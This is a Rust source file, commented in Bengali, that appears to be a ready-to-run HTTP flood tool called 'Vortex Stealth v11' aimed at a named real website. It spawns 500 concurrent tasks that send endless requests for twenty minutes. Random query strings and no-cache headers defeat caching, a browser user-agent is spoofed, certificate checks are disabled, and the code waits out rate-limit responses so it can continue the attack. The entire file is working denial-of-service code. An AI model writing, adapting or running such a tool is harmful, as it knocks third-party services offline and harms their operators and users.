use reqwest::{Client, header};
use std::time::Duration;
use rand::Rng;

#[tokio::main]
async fn main() {
    let target = "https://www.ninjahex.com/"; // তোমার টার্গেট ইউআরএল
    
    let mut headers = header::HeaderMap::new();
    headers.insert(header::USER_AGENT, header::HeaderValue::from_static("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"));
    headers.insert("cache-control", header::HeaderValue::from_static("no-cache"));

    let client = Client::builder()
        .default_headers(headers)
        .use_rustls_tls()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(10))
        .build().unwrap();

    println!("🚀 Vortex Stealth v11 Active | Managing 429 Errors...");

    let mut handles = vec![];
    for i in 0..500 {
        let client_ref = client.clone();
        let target_ref = target.to_string();
        
        handles.push(tokio::spawn(async move {
            let mut rng = rand::thread_rng();
            loop {
                let url = format!("{}?v={}", target_ref, rng.gen::<u32>());
                
                match client_ref.get(&url).send().await {
                    Ok(resp) => {
                        let status = resp.status().as_u16();
                        if i == 0 { println!("📡 Status: {}", status); }

                        // যদি ৪২৯ আসে, তবে কিছুক্ষণ বিরতি দাও যাতে সার্ভার শান্ত হয়
                        if status == 429 {
                            let wait_time = rng.gen_range(500..2000);
                            tokio::time::sleep(Duration::from_millis(wait_time)).await;
                        }
                    }
                    Err(_) => {
                        tokio::time::sleep(Duration::from_millis(100)).await;
                    }
                }
            }
        }));
    }
    tokio::time::sleep(Duration::from_secs(1200)).await;
}
